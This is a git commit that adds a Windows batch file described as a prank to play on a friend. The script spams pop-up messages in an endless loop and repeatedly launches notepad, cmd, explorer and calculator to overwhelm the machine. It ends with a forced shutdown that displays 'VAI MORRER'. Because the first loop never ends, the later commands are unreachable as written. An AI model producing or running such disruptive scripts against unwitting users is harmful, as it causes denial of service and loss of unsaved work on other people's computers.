91b965b07f919a4026b49d2e6eef517e2a875718
Anderson Almeida <anderson.almeida.21012@hotmail.com>
2022-10-09 22:02:07 -0300

    commit inicial

---
+++ Brincadeira para fazer com amigo.bat
@@ -0,0 +1,16 @@
+@echo off
+:loop
+msg * Como vai?	
+goto loop
+
+@echo off
+:loop
+start notepad
+start nspoint
+start cmd
+start explorer
+start calc
+goto loop
+
+
+Shutdown -s -f -t: 30 -c " VAI MORRER "
